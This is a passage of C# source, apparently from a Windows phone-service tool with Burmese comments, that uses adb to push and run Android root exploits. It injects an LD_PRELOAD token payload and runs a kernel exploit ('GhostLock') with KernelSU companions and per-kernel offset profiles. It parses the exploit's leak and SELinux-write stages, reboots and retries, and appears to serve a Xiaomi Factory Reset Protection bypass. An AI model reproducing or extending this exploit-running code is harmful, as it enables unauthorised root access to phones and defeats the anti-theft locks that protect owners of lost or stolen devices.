                   s.Contains("controlled mm") || s.Contains("match_page") || s.Contains("configfs") ||
                   s.Contains("futex") || s.Contains("app fops") || s.Contains("page_owner") ||
                   s.Contains("sock_diag") || s.Contains("prctl_map") || s.Contains("cfi_") ||
                   s.Contains("attempt=") || s.Contains("hint=") || s.Contains("mm dup") ||
                   s.Contains("pipe buf") || s.Contains("page alloc") || s.Contains("prs=") ||
                   s.Contains("hwbinder") || s.Contains("svc_x");
        }

        private async Task<(bool Root, double Sec)> TryMstTempRootAsync()
        {
            const string remote = "/data/local/tmp/.preload.so";
            string local = Path.Combine(Application.StartupPath, "exploits", "payloads", "mst-temproot.elf");
            ToolIntegrity.Verify(local);
            if (!File.Exists(local))
            {
                Log("[i] PMK payload not bundled — skip token root: " + local, Color.Gray);
                return (false, -1);
            }

            Log("[2/4] Token payload (MST) — token-gated, no GUI...", Color.Cyan);

            // payload ရဲ့ FNV input နဲ့ တူအောင်: ro.serialno → ro.boot.serialno → "unknown"
            string serial = (await ExecuteCommandQuickAsync("adb.exe", "shell getprop ro.serialno")).Trim();
            if (serial.IndexOf('\n') >= 0 || serial.Length == 0)
                serial = (await ExecuteCommandQuickAsync("adb.exe", "shell getprop ro.boot.serialno")).Trim();
            serial = serial.Split('\n')[0].Trim();
            if (serial.Length == 0) serial = "unknown";

            if (!await ExecuteCommandCleanAsync("adb.exe", "push \"" + local + "\" \"" + remote + "\"",
                    "PMK Temp Root - push payload", false, false, true))
            {
                Log("[!] payload push failed — PMK path abort.", Color.OrangeRed);
                return (false, -1);
            }
            await ExecuteCommandCleanAsync("adb.exe", "shell chmod 755 \"" + remote + "\"",
                "PMK Temp Root - chmod", false, false, true);

            // epoch = device clock (payload time() ±120s window)
            string epRaw = (await ExecuteCommandQuickAsync("adb.exe", "shell date +%s")).Trim();
            if (!long.TryParse(epRaw, out long epoch) || epoch <= 0)
            {
                Log("[!] device date +%s fail (" + epRaw.Replace("\n", " ").Trim() + ") — temp root skip.", Color.OrangeRed);
                return (false, -1);
            }

            string token = MstToken.Build(serial, epoch);

            string runCmd = "shell \"export LD_PRELOAD=" + remote + "; MS=" + token + " /system/bin/id\"";
            string bindArgs = await BindDeviceArgumentsAsync("adb.exe", runCmd);
            var sw = Stopwatch.StartNew();
            string runOut = await ReviewSafety.RunQuickAsync(ResolveToolPath("adb.exe"), bindArgs, 240000, true);
            sw.Stop();

            // stdout noise filter — run_exploit ရဲ့ PRNG hex တွေ ဖျောက်
            int total = 0, shown = 0;
            foreach (string raw in (runOut ?? "").Replace("\r", "").Split('\n'))
            {
                string t = raw.TrimEnd();
                if (t.Length == 0) continue;
                total++;
                if (IsExploitLogNoise(t)) continue;
                bool keep = t.Contains("MST:") || t.Contains("uid=") ||
                            t.IndexOf("fail", StringComparison.OrdinalIgnoreCase) >= 0 ||
                            t.IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0;
                if (!keep) continue;
                Log("    " + t.Replace("MST:", "root:"), t.Contains("MST:") ? Color.LightGreen : Color.Gray);
                shown++;
            }
            if (string.IsNullOrWhiteSpace(runOut))
                Log("[i] No payload stdout (exit/timeout) — deciding via su probe...", Color.Orange);

            string su = await ProbeSuAsync();
            bool root = su.Contains("uid=0");
            if (root)
                Log("[OK] PMK temp root OK — " + sw.Elapsed.TotalSeconds.ToString("0.0") + "s  ·  " + su, Color.LightGreen);
            else if (runOut != null && runOut.Contains("MST:Pass!"))
                Log("[!] token passed but su probe failed — " + su, Color.Orange);
            return (root, sw.Elapsed.TotalSeconds);
        }

        // ART-style kernel exploit — device: push payload → run · host: run Windows exe → probe su/id
        // attempt=0 → fail ရင် auto-reboot တစ်ခါပြီး retry (same-boot stack-writer burn / flaky leak ကာကွယ်)
        private async Task<(bool Root, double Sec)> TryKernelExploitAsync(string exploitsRoot, ExploitEntry ex, DeviceFingerprint fp, int attempt = 0)
        {
            bool hostMode = string.Equals(ex.RunMode, "host", StringComparison.OrdinalIgnoreCase);
            Log("[3/4] Kernel exploit: " + (string.IsNullOrWhiteSpace(ex.Name) ? ex.Id : ex.Name) +
                (hostMode ? " [host]" : " [device]") +
                (attempt > 0 ? " · retry " + attempt + "/1" : ""), Color.Cyan);

            if (!hostMode && ex.Id.IndexOf("ghostlock", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                string fixNote = KernelExploit.GhostLockFixNote(fp.Kernel, fp.Patch);
                if (!string.IsNullOrEmpty(fixNote)) Log("[i] " + fixNote, Color.Orange);
            }

            string local = KernelExploit.PayloadFullPath(exploitsRoot, ex);
            if (!File.Exists(local))
            {
                Log("[!] Payload missing: " + local, Color.OrangeRed);
                Log("[i] Drop payload binary at path above · manifest: " +
                    Path.Combine(exploitsRoot, "manifest.json"), Color.Gray);
                Log("[i] Skipping exploit — continue no-root path.", Color.Orange);
                return (false, -1);
            }

            int timeoutSec = ex.TimeoutSec <= 0 ? 30 : ex.TimeoutSec;
            double realSec = -1;
            string runOut = "";
            string profileRel = null;

            if (hostMode)
            {
                // Windows host tool — user UI may open; wait then probe device root
                Log("[*] Run host tool: " + local +
                    (string.IsNullOrWhiteSpace(ex.ExecArgs) ? "" : " " + ex.ExecArgs), Color.Orange);
                try
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = local,
                        Arguments = ex.ExecArgs ?? "",
                        WorkingDirectory = Path.GetDirectoryName(local) ?? exploitsRoot,
                        UseShellExecute = true
                    };
                    using var proc = Process.Start(psi);
                    if (proc == null)
                    {
                        Log("[!] Failed to start host tool.", Color.OrangeRed);
                        return (false, -1);
                    }
                    Log("[i] PID " + proc.Id + " — finish the tool UI if it opens, probing root after " +
                        timeoutSec + "s...", Color.Gray);
                    bool exited = await Task.Run(() => proc.WaitForExit(timeoutSec * 1000));
                    if (!exited)
                        Log("[i] Host tool still running — probing device root anyway...", Color.Orange);
                }
                catch (Exception exHost)
                {
                    Log("[!] Host tool error: " + exHost.Message, Color.OrangeRed);
                    return (false, -1);
                }
            }
            else
            {
                string remote = string.IsNullOrWhiteSpace(ex.RemotePath) ? "/data/local/tmp/pmk_exp" : ex.RemotePath.Trim();
                string workDir = string.IsNullOrWhiteSpace(ex.WorkDir) ? "/data/local/tmp" : ex.WorkDir.Trim();
                if (!remote.StartsWith("/")) remote = workDir.TrimEnd('/') + "/" + remote;

                // MST run အတွင်း reboot/ပျောက်ထားရင် push မအောင် — ရှေ့မှာ device ပြန်ရောက်မှ push
                if (!await EnsureTempRootDeviceConnectedAsync())
                {
                    Log("[!] Device did not reconnect — exploit skipped.", Color.OrangeRed);
                    return (false, -1);
                }

                bool pushed = await ExecuteCommandCleanAsync("adb.exe", "push \"" + local + "\" \"" + remote + "\"",
                        "Kernel Exploit - push payload", false, false, true);
                if (!pushed && !tempRootAborted && await EnsureTempRootDeviceConnectedAsync())
                {
                    Log("[i] push failed — device state may have changed, retrying push once...", Color.Orange);
                    pushed = await ExecuteCommandCleanAsync("adb.exe", "push \"" + local + "\" \"" + remote + "\"",
                            "Kernel Exploit - push payload retry", false, false, true);
                }
                if (!pushed)
                {
                    Log("[!] push failed — exploit aborted: " + remote, Color.OrangeRed);
                    return (false, -1);
                }
                await ExecuteCommandCleanAsync("adb.exe", "shell chmod 755 \"" + remote + "\"",
                    "Kernel Exploit - chmod", false, false, true);
                var pushedNames = new List<string> { Path.GetFileName(local) };

                // companions (ksud, kernelsu.ko, …) — push to workDir before run
                if (ex.Companions is { Length: > 0 })
                {
                    foreach (string compRel in ex.Companions)
                    {
                        if (string.IsNullOrWhiteSpace(compRel)) continue;
                        string compLocal = KernelExploit.CompanionFullPath(exploitsRoot, ex, compRel);
                        if (!File.Exists(compLocal))
                        {
                            Log("[!] Companion missing (skip): " + compLocal, Color.Orange);
                            continue;
                        }
                        string compName = Path.GetFileName(compLocal);
                        string compRemote = workDir.TrimEnd('/') + "/" + compName;
                        if (!await ExecuteCommandCleanAsync("adb.exe", "push \"" + compLocal + "\" \"" + compRemote + "\"",
                                "Kernel Exploit - push companion", false, false, true))
                        {
                            Log("[!] companion push failed: " + compName, Color.Orange);
                            continue;
                        }
                        await ExecuteCommandCleanAsync("adb.exe", "shell chmod 755 \"" + compRemote + "\"",
                            "Kernel Exploit - chmod companion", false, false, true);
                        pushedNames.Add(compName);
                    }
                }

                // kernel catalog ထဲက device uname (fp.Kernel) နဲ့ ကိုက်တဲ့ offsets entry ကို ရွေးပြီး
                // /data/local/tmp/offsets.json အဖြစ် push — kernel တစ်ခုချင်းစီအတွက် external offsets
                Log("[OK] push " + string.Join(" · ", pushedNames), Color.LightGreen);

                if (ex.NeedsProfile)
                {
                    // v1.2 GLK1 profile — exploits\profiles\<release>.bin ကို uname exact/prefix နဲ့ ရွေးပြီး push
                    // (v1.2 binary မှာ built-in offsets မရှိ → profile မကိုက်ရင် fail-closed abort)
                    string profilesDir = Path.Combine(exploitsRoot, "profiles");
                    string matchedBin = null, matchedRel = null;
                    if (Directory.Exists(profilesDir))
                    {
                        foreach (string binPath in Directory.GetFiles(profilesDir, "*.bin"))
                        {
                            string rel = Path.GetFileNameWithoutExtension(binPath) ?? "";
                            if (rel.Length == 0) continue;
                            bool exact = string.Equals(rel, fp.Kernel, StringComparison.Ordinal);
                            bool prefix = !string.IsNullOrWhiteSpace(fp.Kernel) &&
                                          (fp.Kernel.StartsWith(rel, StringComparison.Ordinal) ||
                                           rel.StartsWith(fp.Kernel, StringComparison.Ordinal));
                            if (exact || (prefix && (matchedBin == null || rel.Length > matchedRel.Length)))
                            {
                                matchedBin = binPath;
                                matchedRel = rel;
                                if (exact) break;
                            }
                        }
                    }
                    if (matchedBin == null)
                    {
                        Log("[!] No GLK1 profile for " + fp.Kernel + " — exploit aborted (v1.2 has no built-in offsets).", Color.OrangeRed);
                        return (false, -1);
                    }
                    try { ToolIntegrity.Verify(matchedBin); }
                    catch (Exception exProf)
                    {
                        Log("[!] profile integrity: " + exProf.Message, Color.OrangeRed);
                        return (false, -1);
                    }
                    string tmpProfile = Path.Combine(Path.GetTempPath(), "pmk_profile.bin");
                    File.Copy(matchedBin, tmpProfile, true);
                    string remoteProfile = workDir.TrimEnd('/') + "/profile.bin";
                    if (!await ExecuteCommandCleanAsync("adb.exe", "push \"" + tmpProfile + "\" \"" + remoteProfile + "\"",
                            "Kernel Exploit - push profile", false, false, true))
                    {
                        Log("[!] profile push failed — exploit aborted.", Color.OrangeRed);
                        return (false, -1);
                    }
                    await ExecuteCommandCleanAsync("adb.exe", "shell chmod 644 \"" + remoteProfile + "\"",
                        "Kernel Exploit - chmod profile", false, false, true);
                    profileRel = matchedRel;
                    string provenance = KernelExploit.ProfileProvenance(exploitsRoot, matchedRel);
                    Log("[OK] profile push (GLK1) · " + matchedRel + " · " + provenance,
                        provenance == "upstream-verified" ? Color.LightGreen : Color.Orange);
                }
                else
                {
                    string catalogPath = Path.Combine(exploitsRoot, "payloads", "offsets-catalog.json");
                    string matchedJson = null, matchedRel = null;
                    if (File.Exists(catalogPath))
                    {
                        try
                        {
                            ToolIntegrity.Verify(catalogPath);
                            using (JsonDocument catDoc = JsonDocument.Parse(File.ReadAllText(catalogPath)))
                            {
                                string bestRel = null;
                                foreach (JsonElement ent in catDoc.RootElement.EnumerateArray())
                                {
                                    if (!ent.TryGetProperty("release", out JsonElement relEl)) continue;
                                    string rel = relEl.GetString() ?? "";
                                    if (rel.Length == 0) continue;
                                    bool exact = string.Equals(rel, fp.Kernel, StringComparison.Ordinal);
                                    bool prefix = !string.IsNullOrWhiteSpace(fp.Kernel) &&
                                                  (fp.Kernel.StartsWith(rel, StringComparison.Ordinal) ||
                                                   rel.StartsWith(fp.Kernel, StringComparison.Ordinal));
                                    if (exact || (prefix && (matchedJson == null || rel.Length > (bestRel?.Length ?? 0))))
                                    {
                                        matchedJson = ent.GetRawText();
                                        matchedRel = rel;
                                        bestRel = rel;
                                        if (exact) break;
                                    }
                                }
                            }
                        }
                        catch (Exception exCat)
                        {
                            Log("[!] offsets catalog: " + exCat.Message, Color.Orange);
                        }
                    }
                    if (matchedJson != null)
                    {
                        string tmpOffsets = Path.Combine(Path.GetTempPath(), "pmk_offsets.json");
                        File.WriteAllText(tmpOffsets, matchedJson);
                        string remoteOffsets = workDir.TrimEnd('/') + "/offsets.json";
                        if (await ExecuteCommandCleanAsync("adb.exe", "push \"" + tmpOffsets + "\" \"" + remoteOffsets + "\"",
                                "Kernel Exploit - push offsets", false, false, true))
                        {
                            await ExecuteCommandCleanAsync("adb.exe", "shell chmod 644 \"" + remoteOffsets + "\"",
                                "Kernel Exploit - chmod offsets", false, false, true);
                            Log("[OK] offsets push (catalog) · " + matchedRel, Color.LightGreen);
                        }
                        else Log("[!] offsets push failed — falling back to built-in offsets", Color.Orange);
                    }
                    else
                        Log("[i] No catalog entry for " + fp.Kernel + " — using built-in offsets", Color.Gray);
                }

                // ယခင် run ကနေ ကျန်ခဲ့တဲ့ ksu marker ကို ရှင်း — stale marker false-positive ကာကွယ်
                await ExecuteCommandQuickAsync("adb.exe", "shell rm -f /data/local/tmp/.ghostlock_ksu.log");
                // run ဟောင်းရဲ့ device log ကို ဖျက်ပြီး ဒီ run ရဲ့ လိုင်းတွေပဲ ကျန်စေ —
                // failure signature က ဟောင်း run ရဲ့ counter/verdict ကို မဖတ်စေဖို့
                await ExecuteCommandQuickAsync("adb.exe",
                    "shell rm -f /data/local/tmp/zircon-app-run.log /data/local/tmp/ghostlock-run.log");

                string runCmd;
                if (remote.StartsWith("/"))
                    runCmd = "shell \"" + remote + "\"" + (string.IsNullOrWhiteSpace(ex.ExecArgs) ? "" : " " + ex.ExecArgs);
                else
                    runCmd = "shell cd \"" + workDir + "\" && \"./" + remote + "\"" +
                             (string.IsNullOrWhiteSpace(ex.ExecArgs) ? "" : " " + ex.ExecArgs);

                Log("[*] Running exploit (timeout " + timeoutSec + "s)...", Color.Orange);
                // GhostLock race can take 15-45s — use timeoutSec, not ExecuteCommandQuickAsync's 15s default
                // returnOutputOnFailure=true: payload fail path (exit≠0) ကောင်းကောင်း stdout လိုချင်
                // progress ticker — exploit ပိတ်နေတယ် မထင်စေဖို့ 30s တစ်ခါ elapsed ပြ
                var expTask = ReviewSafety.RunQuickAsync(ResolveToolPath("adb.exe"), runCmd,
                    timeoutSec * 1000, true);
                _ = Task.Run(async () =>
                {
                    int tickSec = 0;
                    while (!expTask.IsCompleted && tickSec < timeoutSec)
                    {
                        await Task.Delay(30000);
                        if (expTask.IsCompleted) break;
                        tickSec += 30;
                        Log("[i] Exploit running... " + tickSec + "s / " + timeoutSec + "s", Color.Gray);
                    }
                });
                runOut = await expTask;
                if (!string.IsNullOrWhiteSpace(runOut))
                {
                    // full output debug အတွက် file ထဲ သိမ်း — log box မှာ key line တွေပဲ ပြ
                    try { File.WriteAllText(Path.Combine(Path.GetTempPath(), "pmk_exploit_stdout.log"), runOut); }
                    catch { }
                    int totalLines = 0, shownLines = 0;
                    foreach (string raw in runOut.Replace("\r", "").Split('\n'))
                    {
                        string t = Regex.Replace(raw, "\u001b\\[[0-9;]*m", "").TrimEnd();
                        if (t.Length == 0) continue;
                        totalLines++;
                        if (IsExploitLogNoise(t)) continue;
                        bool keep = t.Contains("no offsets") || t.Contains("external offsets") ||
                                    t.Contains("exploit complete") ||
                                    t.Contains("SELinux permissive") ||
                                    t.Contains("child is root") ||
                                    t.Contains("enforcing restored") || t.Contains("KernelSU ready") ||
                                    t.Contains("never rooted") || t.Contains("rejected") ||
                                    t.Contains("resolved profile loaded") || t.Contains("profile release mismatch") ||
                                    t.Contains("cannot load profile") || t.Contains("no entrypoint") ||
                                    t.Contains("temporary root ready") ||
                                    t.IndexOf("fail", StringComparison.OrdinalIgnoreCase) >= 0 ||
                                    t.IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0;
                        if (!keep) continue;
                        t = Regex.Replace(t, @"\s*\[T\+\d+ms\]", "");
                        t = Regex.Replace(t, @"\s{2,}", " ");
                        Color lc;
                        if (t.Contains("exploit complete")) lc = Color.Cyan;
                        else if (t.Contains("never rooted") || t.Contains("rejected") ||
                                 t.Contains("no offsets") || t.Contains("external offsets") ||
                                 t.Contains("profile release mismatch") || t.Contains("cannot load profile") ||
                                 t.Contains("no entrypoint") ||
                                 // "parse_fail=0" က အောင်မြင်တဲ့ counter — error အရောင် မပေးနဲ့
                                 (!t.Contains("parse_fail=0") &&
                                  t.IndexOf("fail", StringComparison.OrdinalIgnoreCase) >= 0) ||
                                 t.IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0)
                            lc = Color.OrangeRed;
                        else if (t.Contains("offsets matched") || t.Contains("child uid") ||
                                 t.Contains("child is root") || t.Contains("SELinux permissive") ||
                                 t.Contains("Write 1 complete") || t.Contains("enforcing restored") ||
                                 t.Contains("KernelSU ready") ||
                                 t.Contains("resolved profile loaded") ||
                                 t.Contains("temporary root ready"))
                            lc = Color.LightGreen;
                        else lc = Color.Gray;
                        Log("    " + t, lc);
                        shownLines++;
                    }
                }
                else
                {
                    Log("[i] No exploit stdout (exit/timeout) — probing root directly...", Color.Orange);
                }

                // actual exploit time ကို [T+Xms] exploit complete က ဖတ် (timeout wait မဟုတ်)
                {
                    string parseSrc = runOut;
                    if (string.IsNullOrWhiteSpace(parseSrc))
                        parseSrc = await ExecuteCommandQuickAsync("adb.exe",
                            "shell tail -n 120 /data/local/tmp/ghostlock-run.log");
                    if (!string.IsNullOrWhiteSpace(parseSrc))
                    {
                        var mT = System.Text.RegularExpressions.Regex.Match(parseSrc,
                            @"\[T\+(\d+)ms\]\s+exploit complete");
                        if (mT.Success && int.TryParse(mT.Groups[1].Value, out int msT))
                            realSec = msT / 1000.0;
                    }
                }
            }

            string pattern = string.IsNullOrWhiteSpace(ex.SuccessPattern) ? "uid=0" : ex.SuccessPattern;
            string[] patternParts = pattern.Split('|', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);

            string suId = await ProbeSuAsync();
            bool ok = suId.Contains("uid=0");
            if (!ok)
            {
                // KernelSU late-load can need a beat; retry once after adb root probe
                await ExecuteCommandQuickAsync("adb.exe", "root");
                await Task.Delay(800);
                suId = await ProbeSuAsync();
                ok = suId.Contains("uid=0");
            }
            if (ok)
            {
                return (true, realSec);
            }

            string idOut = (await ExecuteCommandQuickAsync("adb.exe", "shell id")).Trim();
            if (idOut.Contains("uid=0"))
            {
                Log("[OK] id: " + idOut, Color.LightGreen);
                return (true, realSec);
            }

            // Pattern match on success indicators (KernelSU ready / module loaded / ksu log)
            foreach (string p in patternParts)
            {
                if (string.IsNullOrWhiteSpace(p) || p == "uid=0") continue;
                if (suId.IndexOf(p, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    idOut.IndexOf(p, StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    Log("[OK] Success pattern matched: " + p, Color.LightGreen);
                    return (true, realSec);
                }
            }
            // GhostLock root script log — proves uid=0 even if su probe raced
            string ksuLog = (await ExecuteCommandQuickAsync("adb.exe", "shell cat /data/local/tmp/.ghostlock_ksu.log")).Trim();
            if (!string.IsNullOrWhiteSpace(ksuLog))
            {
                foreach (string line in ksuLog.Replace("\r", "").Split('\n'))
                {
                    string t = line.TrimEnd();
                    if (t.Length == 0) continue;
                    if (t.IndexOf("fail", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        t.IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0)
                        Log("    " + t, Color.OrangeRed);
                }
                if (ksuLog.IndexOf("KernelSU module loaded", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    ksuLog.IndexOf("KernelSU ready", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    ksuLog.IndexOf("root script start uid=0", StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    Log("[OK] GhostLock root script confirmed uid=0 (ksu log)", Color.LightGreen);
                    // su daemon settle — probe အရင်ခေါ် (su ready ဆို ချက်ချင်းပြီး)၊ fail မှ 5s စောင့် ထပ်စမ်း
                    for (int i = 0; i < 4; i++)
                    {
                        suId = await ProbeSuAsync();
                        if (suId.Contains("uid=0"))
                        {
                            Log("[OK] Exploit root (settled): " + suId, Color.LightGreen);
                            suPathCache.Clear(); // root တက်ပြီ → PATH su ပြန်ရှာ (tmpsu cache ဖယ်)
                            return (true, realSec);
                        }
                        if (i < 3) await Task.Delay(5000);
                    }
                    return (true, realSec);
                }
            }
            // Final su probe after log check (module may have settled)
            suId = await ProbeSuAsync();
            if (suId.Contains("uid=0"))
            {
                Log("[OK] Exploit root (retry): " + suId, Color.LightGreen);
                return (true, realSec);
            }

            if (hostMode)
            {
                Log("[!] Host tool finished/timeout — no uid=0 on device yet. " +
                    "Complete any dialog in the tool window, then re-run Xiaomi Temp FRP.", Color.OrangeRed);
                return (false, -1);
            }

            Log("[!] Exploit finished but no root (su probe empty/fail).", Color.OrangeRed);

            // (၁) ဖြစ်ရပ်အကြောင်းရင်း — ဒီ run ရဲ့ device log tail (run မတိုင်မီ ဟောင်းကို ဖျက်ထားတယ်)
            {
                var devShown = new System.Collections.Generic.HashSet<string>(
                    (runOut ?? "").Replace("\r", "").Split('\n').Select(r => r.TrimEnd()), StringComparer.Ordinal);
                foreach (string lg in new[] { "/data/local/tmp/ghostlock-run.log", "/data/local/tmp/zircon-app-run.log" })
                {
                    string devTail = await ExecuteCommandQuickAsync("adb.exe", "shell tail -n 25 " + lg);
                    if (string.IsNullOrWhiteSpace(devTail)) continue;
                    bool header = false;
                    foreach (string raw in devTail.Replace("\r", "").Split('\n'))
                    {
                        string t = Regex.Replace(raw, "\u001b\\[[0-9;]*m", "").TrimEnd();
                        if (t.Length == 0 || !devShown.Add(t)) continue;
                        if (!header)
                        {
                            Log("    ---- " + Path.GetFileName(lg) + " (this run) ----", Color.Gray);
                            header = true;
                        }
                        bool bad = t.IndexOf("[!]", StringComparison.Ordinal) >= 0 ||
                                   t.IndexOf("no offsets", StringComparison.OrdinalIgnoreCase) >= 0 ||
                                   t.IndexOf("fail", StringComparison.OrdinalIgnoreCase) >= 0 ||
                                   t.IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0;
                        Log("    " + t, bad ? Color.OrangeRed : Color.Gray);
                    }
                    if (header) Log("    --------------------------------", Color.Gray);
                }
            }

            // (ခ) failure signature — ဒီ run ရဲ့ stdout၊ မလောက်ရင် ဒီ run ရဲ့ device log ကို ဖတ်တယ်။
            // run မတိုင်မီ /data/local/tmp က log နှစ်ခုလုံးကို ဖျက်ထားတာမို့ ဟောင်း run ရဲ့ လိုင်း မပါနိုင်ဘူး။
            string sigSrc = runOut ?? "";
            string sigSource = "this run's stdout";

            // Exploit က internal attempt တစ်ခုစီအတွက် summary လိုင်း တစ်ကြောင်း ထုတ်တယ် —
            // counters အားလုံးကို လိုင်းတစ်ကြောင်းတည်း (နောက်ဆုံး attempt) ကနေ ယူမှ တစ်ခုနဲ့တစ်ခု မရောဘူး။
            string leakSummary = KernelExploit.LastLeakSummaryLine(sigSrc, out int leakSummaryCount);

            if (leakSummary == null)
            {
                // stdout မှာ summary မပါ (payload က buffered stdout ဆုံးရှုံး) → ဒီ run ရဲ့ log နှစ်ဖိုင်လုံး ဖတ်၊
                // summary ကို ရှာတွေ့တဲ့အထိပဲ ဆက် (ghostlock-run = wrapper, zircon-app-run = exploit ရဲ့ slide detail)
                foreach (string lg in new[] { "/data/local/tmp/ghostlock-run.log", "/data/local/tmp/zircon-app-run.log" })
                {
                    string tail = await ExecuteCommandQuickAsync("adb.exe", "shell tail -n 200 " + lg);
                    if (string.IsNullOrWhiteSpace(tail)) continue;
                    sigSrc += "\n" + tail;
                    sigSource = "this run's device log";
                    leakSummary = KernelExploit.LastLeakSummaryLine(sigSrc, out leakSummaryCount);
                    if (leakSummary != null) break;
                }
            }

            bool burnt = sigSrc.IndexOf("refusing retry", StringComparison.OrdinalIgnoreCase) >= 0 ||
                         sigSrc.IndexOf("stack writer ran", StringComparison.OrdinalIgnoreCase) >= 0;

            // leak plan screened 0 candidates out of a fully parsed tracefs page set (parse_fail=0):
            // profile's caller list does not describe this kernel — a reboot cannot change that.
            var leak = KernelExploit.LeakCounters(leakSummary);
            int leakCandidates = leak?.Candidates ?? -1;
            int leakCallers = leak?.Callers ?? -1;
            int leakParseFail = leak?.ParseFail ?? -1;
            if (leak != null)
                Log("[i] Leak counters (" + sigSource + ", summary #" + leakSummaryCount +
                    " of this run): " + leakSummary!.Trim(), Color.Gray);
            bool leakPlanMismatch = leakCandidates == 0 && leakCallers > 0 && leakParseFail == 0;

            if (leakPlanMismatch)
            {
                Log("[!] Leak stage screened 0 candidates from " + leakCallers +
                    " parsed tracefs callers (parse_fail=0) — this kernel does not fit the profile.",
                    Color.OrangeRed);
                if (profileRel != null)
                    Log("[i] Profile " + profileRel + " · " +
                        KernelExploit.ProfileProvenance(exploitsRoot, profileRel), Color.Orange);
                Log("[i] A reboot cannot change a profile mismatch — no retry.", Color.Orange);
                return (false, -1);
            }

            // "Write 1 failed" = the W1 SELinux write did not verify. Two shapes:
            //   route reported success (success=1 / status=0) yet SELinux did not change → the write never
            //     landed: a kernel that clears the stale waiter (remove_waiter() fix) or a profile page that
            //     is in the direct map but wrong;
            //   route refused → the profile's kernel_phys_load / kernel_phys_offset do not describe this build.
            // Neither can be changed by a reboot — no retry.
            // (observed shape: "W1: SELinux attempt 1/1" then "[-] Write 1 failed")
            bool w1Exhausted = sigSrc.Contains("Write 1 failed");
            if (w1Exhausted)
            {
                if (profileRel != null)
                    Log("[i] Profile " + profileRel + " · " +
                        KernelExploit.ProfileProvenance(exploitsRoot, profileRel), Color.Orange);
                string runningNote = KernelExploit.PatchedFirmwareNote(exploitsRoot, fp.Kernel);
                if (runningNote != null || KernelExploit.RouteClaimedWrite(sigSrc))
                {
                    if (runningNote != null)
                    {
                        Log("[!] UNSUPPORTED FIRMWARE — " + fp.Kernel, Color.OrangeRed);
                        Log("    " + runningNote, Color.Orange);
                    }
                    else
                    {
                        Log("[!] `Write 1 failed` after the route reported success — the write was acknowledged " +
                            "but the SELinux value did not change.", Color.OrangeRed);
                        Log("[i] Either the kernel already carries the remove_waiter() fix (CVE-2026-43499) " +
                            "or this profile's phys page is in the direct map but points at the wrong page.",
                            Color.Orange);
                    }
                    Log("[i] Check the firmware's fix status first; if it is not patched, re-extract " +
                        "kernel_phys_load / kernel_phys_offset from vendor_boot.img.", Color.Orange);
                }
                else
                {
                    Log("[i] `Write 1 failed` = kernel_phys_load / kernel_phys_offset in the GLK1 profile are " +
                        "missing or wrong for this build (MediaTek). Re-extract both from vendor_boot.img.",
                        Color.Orange);
                }
                Log("[i] A reboot cannot change a kernel or a profile value — no retry.", Color.Orange);
                return (false, -1);
            }

            if (attempt == 0)
            {
                Log(burnt
                        ? "[i] Stack writer already used on this boot — same-boot retry would be refused by the exploit"
                        : "[i] Leak/pipe stage failed — probabilistic (flaky)",
                    Color.Orange);
                Log("[*] Auto-reboot then one retry (1/1)...", Color.Orange);
                rebootWaitActive = true;
                try
                {
                    Log("[i] Device rebooting — waiting for reconnect...", Color.Cyan);
                    await ExecuteCommandQuickAsync("adb.exe", "reboot");
                    await Task.Delay(8000);
                    await ExecuteCommandCleanAsync("adb.exe", "wait-for-device", "Temp Root - wait device", false, true, quiet: true, timeoutSec: 180);
                    for (int i = 0; i < 30; i++)
                    {
                        string bc = (await ExecuteCommandQuickAsync("adb.exe", "shell getprop sys.boot_completed")).Trim();
                        if (bc.StartsWith("1")) break;
                        await Task.Delay(2000);
                    }
                    await Task.Delay(3000);
                }
                finally { rebootWaitActive = false; }
                return await TryKernelExploitAsync(exploitsRoot, ex, fp, attempt + 1);
            }

            Log(burnt
                    ? "[i] Hint: reboot ပြီးမှ ပြန်စမ်းပါ — same-boot retry က exploit ကိုယ်တိုင် ငြင်းတယ် (auto-reboot 1/1 ပြီးဆုံး)"
                    : "[i] Hint: reboot ပြီး ထပ်စမ်းကြည့်ပါ — leak stage က တစ်ခါတလေ fail ဖြစ်တတ်တယ်",
                Color.Orange);
            return (false, -1);
        }

        // ================= HUAWEI DRIVER PACK (OPEN HUAWEI 2018) =================
        // csproj TargetPath = %(RecursiveDir)%(Filename)%(Extension) → output ထဲမှာ huawei-drivers\ (bundled-tools\ မပါ)

    }
}
